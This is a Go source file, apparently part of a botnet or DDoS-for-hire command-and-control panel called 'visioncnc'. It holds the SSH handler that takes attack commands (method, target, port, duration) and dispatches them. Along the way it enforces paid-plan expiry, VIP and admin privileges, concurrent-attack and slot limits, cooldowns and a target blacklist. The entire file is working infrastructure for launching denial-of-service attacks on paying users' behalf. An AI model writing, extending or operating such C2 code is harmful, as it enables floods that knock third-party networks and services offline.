package handlers

import (
	"fmt"
	"strconv"
	"visioncnc/database"
	"visioncnc/managers"
	"visioncnc/utils"

	"github.com/gliderlabs/ssh"
)

// AttackHandler validates and dispatches attack commands
func AttackHandler(db *database.Database, session ssh.Session, args []string, config *utils.Config) {
	userInfo := db.GetAccountInfo(session.User())
	methods := utils.GetMethodsList()

	// Only process if first arg is a known attack method
	if !managers.Contains(methods, args[0]) {
		return
	}

	brandingData := BuildBrandingData(session, db)

	if len(args) < 4 {
		msg := utils.Branding(session, "invalid-usage", brandingData)
		utils.SendMessage(session, msg+"\u001B[0m", true)
		return
	}

	// Expired account check
	if db.IsAccountExpired(session.User()) {
		theme := utils.GetTheme()
		utils.SendMessage(session, theme.Colors.Error+"Your plan has expired."+theme.Colors.Reset, true)
		return
	}

	// Attacks disabled check
	if !config.Attacks_enabled && userInfo.Admin != 1 {
		msg := utils.Branding(session, "attacks-disabled", brandingData)
		utils.SendMessage(session, msg, true)
		return
	}

	// Validate target format
	if len(args) > 1 && !utils.IsValidTarget(args[1]) {
		msg := utils.Branding(session, "invalid-usage", brandingData)
		utils.SendMessage(session, msg, true)
		return
	}

	// Blacklist check
	if isBlacklisted(args[1]) {
		lm := managers.GetSharedLogManager()
		if lm != nil {
			lm.LogEvent("blacklist_blocked", map[string]string{
				"source":   "C2",
				"username": session.User(),
				"target":   args[1],
				"port":     args[2],
				"time":     args[3],
				"method":   args[0],
			})
		}
		msg := utils.Branding(session, "blocked-target", brandingData)
		utils.SendMessage(session, msg, true)
		return
	}

	// Spam protection
	if userInfo.BypassSpam != 1 && db.IsSpamming(session.User()) {
		msg := utils.Branding(session, "spam-protection", brandingData)
		utils.SendMessage(session, msg, true)
		return
	}

	// Slot validation (global + method + layer)
	if !validateSlots(db, session, config, args[0], userInfo) {
		return
	}

	// Cooldown checks
	if !checkCooldowns(db, session, config, userInfo) {
		return
	}

	// Concurrents limit
	if db.GetUserCurrentAttacksCount(session.User()) >= userInfo.Concurrents {
		msg := utils.Branding(session, "concurrents-limit", brandingData)
		utils.SendMessage(session, msg, true)
		return
	}

	// Power saving: check if target already under attack
	if userInfo.PowerSaving != 1 {
		if db.IsTargetCurrentlyUnderAttack(args[1]) {
			msg := utils.Branding(session, "target-under-attack", brandingData)
			utils.SendMessage(session, msg, true)
			return
		}
	}

	// Build and execute attack
	atk, err := managers.NewAttack(session, args, userInfo.Vip == 1, userInfo.Private == 1, userInfo.Admin == 1, userInfo.Maxtime, db)
	if err != nil {
		session.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		return
	}

	isError, errMsg, msg := atk.Build(session, db, config)
	if isError {
		theme := utils.GetTheme()
		utils.SendMessage(session, fmt.Sprintf("%s%s%s", theme.Colors.Error, errMsg.Error(), theme.Colors.Reset), true)
	} else {
		utils.SendMessage(session, msg, true)
		db.LogAttack(session.User(), atk.Target, atk.Port, int(atk.Duration), atk.MethodName)
	}
}

func isBlacklisted(target string) bool {
	blockedIPS := utils.ReadBlacklistedIPs("assets/blacklists/list.json")
	return utils.IsTargetBlocked(target, blockedIPS)
}

func validateSlots(db *database.Database, session ssh.Session, config *utils.Config, method string, userInfo database.AccountInfo) bool {
	theme := utils.GetTheme()

	methodConfig, err := utils.GetMethodConfig(method)
	if err != nil {
		utils.SendMessage(session, theme.Colors.Error+"Method configuration not found"+theme.Colors.Reset, true)
		return false
	}

	// Per-method slots
	if db.GetCurrentAttacksLength2(methodConfig.Method) >= methodConfig.Slots {
		utils.SendMessage(session, theme.Colors.Error+"All slots of method `"+methodConfig.Method+"` ("+strconv.Itoa(methodConfig.Slots)+") are currently in use!"+theme.Colors.Reset, true)
		return false
	}

	// Global slots
	if db.GetCurrentAttacksLength() > config.Global_slots {
		utils.SendMessage(session, theme.Colors.Error+"Global network slots ("+strconv.Itoa(config.Global_slots)+") are currently in use"+theme.Colors.Reset, true)
		return false
	}

	// Per-layer slots
	if limit, ok := config.Layer_slots[methodConfig.Group]; ok && limit > 0 {
		if db.GetCurrentAttacksLengthByGroup(methodConfig.Group) >= limit {
			brandingData := BuildBrandingData(session, db)
			msg := utils.Branding(session, "layer-limit", brandingData)
			if msg == "" {
				utils.SendMessage(session, theme.Colors.Error+methodConfig.Group+" layer slots ("+strconv.Itoa(limit)+") are currently in use"+theme.Colors.Reset, true)
			} else {
				utils.SendMessage(session, msg, true)
			}
			return false
		}
	}

	return true
}

func checkCooldowns(db *database.Database, session ssh.Session, config *utils.Config, userInfo database.AccountInfo) bool {
	if userInfo.Admin != 1 {
		if cooldown := db.HowLongOnCooldown(session.User(), userInfo.Cooldown); cooldown > 0 {
			utils.SendMessage(session, fmt.Sprintf("You are on cooldown. (%d seconds left)\u001B[0m", cooldown), true)
			return false
		}
		if globalCooldown := db.HowLongOnGlobalCooldown(config.Global_cooldown); globalCooldown > 0 {
			utils.SendMessage(session, fmt.Sprintf("You are on global cooldown. (%d seconds left)\u001B[0m", globalCooldown), true)
			return false
		}
	}
	return true
}
